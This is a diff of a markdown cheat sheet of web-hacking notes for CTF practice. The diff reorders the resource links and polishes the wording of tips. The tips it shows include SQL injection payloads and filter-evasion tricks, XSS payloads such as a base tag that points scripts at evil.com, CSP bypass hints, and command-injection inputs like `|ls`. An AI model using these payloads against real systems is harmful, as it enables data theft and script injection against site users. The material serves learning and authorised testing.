@@ -1,4 +1,36 @@
 ##  ► web
+### Resources
+#### Courses
+
+- [Web Security Academy](https://portswigger.net/web-security)
+- [Pentesterlab](https://pentesterlab.com/)
+- [OWASP-wstg](https://owasp.org/www-project-web-security-testing-guide/)
+- [Hacker101](https://www.hackerone.com/hacker101)
+
+#### CTF
+
+- [247/CTF](https://247ctf.com/)
+- [websec.fr](http://websec.fr/)
+- [webhacking.kr](https://webhacking.kr/)
+- [CTF Challenge](https://ctfchallenge.co.uk/)
+- [Hacker101 CTF](https://ctf.hacker101.com/)
+- [Google XSS Game](https://xss-game.appspot.com/)
+- [Natas - OverTheWire](https://overthewire.org/wargames/natas/)
+- [pwnfunction XSS Game](https://xss.pwnfunction.com/)
+
+#### Vulnerable Apps
+
+- [Juice Shop](https://owasp.org/www-project-juice-shop/)
+- [bWAPP](http://www.itsecgames.com/)
+- [Vulhub](https://github.com/vulhub/vulhub)
+- [DVWA](http://www.dvwa.co.uk/)
+
+#### Bug Bounty
+
+- [Web Hacking 101](https://leanpub.com/web-hacking-101)
+- [Real World Bug Hunting](https://www.amazon.in/Real-World-Bug-Hunting-Field-Hacking-ebook/dp/B072SQZ2LG)
+- [Resources for Beginner Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/)
+- [Intigriti Article](https://kb.intigriti.com/en/articles/3471127-useful-resources-about-web-hacking-bug-bounty)
 
 ### Tips
 
@@ -10,7 +42,7 @@
 - The server might be Windows. Don't forget, in case of webshells, you might need different commands. 
 - For a newline, somtimes you need CRLF, individual CR or LF might not work: `%0d%0a` (webhacking.kr - 38).
 - Just because a request fails with one method doesn't mean it will fail with a different method. Try `PUT` instead of `GET`.
-- Using HTTP method `OPTIONS` to know what methods are allowed on the endpoint.
+- Use HTTP method `OPTIONS` to know what methods are allowed on the endpoint.
 - Sometimes, `Wappalyzer` may detect extra information in different pages (or in view-source).
 - Keep noting interesting things. While jumping from one feature to the next you might forget something.
 - To go directly into console in devtools `Ctrl-shift-J` similarly you can find shortcuts for other tabs.
@@ -276,17 +308,17 @@ $ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httpr
 - Oracle comments don't work with semicolon. `OR 1=1--` might work when `OR 1=1;--` doesn't.
 - MySQL comments `--` require a space after them to work `-- `.
 - Remember to encode spaces to `+` and other url unsafe characters as well.
-- When using `UNION` to extract `table\_name`, make sure that it is positioned with a column that has the same datatype.
+- When using `UNION` to extract `table_name`, make sure that it is positioned with a column that has the same datatype.
 - In where clause, try to use quotes to cover table and column names.
 - While `union` can be used with `select`, look for **stacked queries** to execute any SQL statement. Remember to commit.
-- If any words are filtered, see if they are done recursively. If not, `selselectect` if will work.
-- If whitespaces are filtered you can use alternates to spaces such as: `[tabs] %0a %00 %09 %0d /**/`
+- If any words are filtered, see if they are done recursively. If not, `selselectect` should work.
+- If spaces are blacklisted, you can use alternates such as: `[tabs] %0a %00 %09 %0d /**/`
 - If you are in the context of MySQL, you can use variables without explicitly defining them. For example if "admin" is being filtered, you can put "nimda" as one of the columns (say, id) and use `reverse(id)` in another column (webhacking.kr - 59).
 - To just see tables created by the user in MySQL: `union select table_name,null,null from information_schema.tables where table_schema not in ('information_schema','mysql','performance_schema')`
 - Syntax of LIMIT: `LIMIT offset,quantity` where offset starts from 0.
 - [Portswigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
 - For time-based, first figure out the max time a request can take.
-- For faster blind-sqli execution, first check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then from that filtered list of characters, check the real order of the target string `i*`.
+- For faster blind-sqli execution, in the first pass check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then in the second pass, from that filtered list of characters check the real order of the target string `i*`.
 - Remember to start `substring(str,pos,len)` from `1` not `0`.
 - Use `LIKE BINARY` for case-senstivie blind sqli matching.
 - For postgres time-based, `||pg_sleep(10)`
@@ -338,16 +370,16 @@ var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
 - Strings can be concatenated using minus `-` sign. In a js `eval` context you can use: `"-alert(1)-"`
 - Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
 - To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
-- If there is any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
+- If there are any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
 - `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
 - XSS can also be done through file-uploads in case HTML or SVG files are allowed to be uploaded.
 - Blind XSS:
-    - Read `https://brutelogic.com.br/blog/blind-xss-code/` get the code here `http://brutelogic.com.br/brutal/blind/index.txt`.
-    - Use `http://xss.rocks/xss.js` for including an `alert()` js file.
-    - Use `xsshunter.com` to test for blind xss.
+    - Read https://brutelogic.com.br/blog/blind-xss-code/ and get the code here: http://brutelogic.com.br/brutal/blind/index.txt
+    - Use http://xss.rocks/xss.js for including an `alert()` js file.
+    - Use http://xsshunter.com to test for blind xss.
 - CSP Bypass:
     - In your devtools, look at the network tab and within the headers for the response, you'll see the CSP header.
-    - You can also copy the url and put it into Google's CSP Evaluator at: `csp-evaluator.withgoogle.com`
+    - You can also copy the url and put it into Google's CSP Evaluator at: https://csp-evaluator.withgoogle.com
     - If `default-src` is `self`, it can be problematic if the user can upload files.
 - [XSS in postMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-postmessage)
 
@@ -370,40 +402,6 @@ var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
 - Try `|ls`.
 - For time delays use `sleep 10` or `& ping -c 10 127.0.0.1 &`
 - Redirect output to a file you can read using your browser.
-
-### Resources
-
-#### Courses
-
-- [Web Security Academy](https://portswigger.net/web-security)
-- [Pentesterlab](https://pentesterlab.com/)
-- [OWASP-wstg](https://owasp.org/www-project-web-security-testing-guide/)
-- [Hacker101](https://www.hackerone.com/hacker101)
-
-#### CTF
-
-- [247/CTF](https://247ctf.com/)
-- [websec.fr](http://websec.fr/)
-- [webhacking.kr](https://webhacking.kr/)
-- [CTF Challenge](https://ctfchallenge.co.uk/)
-- [Hacker101 CTF](https://ctf.hacker101.com/)
-- [Google XSS Game](https://xss-game.appspot.com/)
-- [Natas - OverTheWire](https://overthewire.org/wargames/natas/)
-- [pwnfunction XSS Game](https://xss.pwnfunction.com/)
-
-#### Vulnerable Apps
-
-- [Juice Shop](https://owasp.org/www-project-juice-shop/)
-- [bWAPP](http://www.itsecgames.com/)
-- [Vulhub](https://github.com/vulhub/vulhub)
-- [DVWA](http://www.dvwa.co.uk/)
-
-#### Bug Bounty
-
-- [Web Hacking 101](https://leanpub.com/web-hacking-101)
-- [Real World Bug Hunting](https://www.amazon.in/Real-World-Bug-Hunting-Field-Hacking-ebook/dp/B072SQZ2LG)
-- [Resources for Beginner Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/)
-- [Intigriti Article](https://kb.intigriti.com/en/articles/3471127-useful-resources-about-web-hacking-bug-bounty)
 
 ### Recon
 
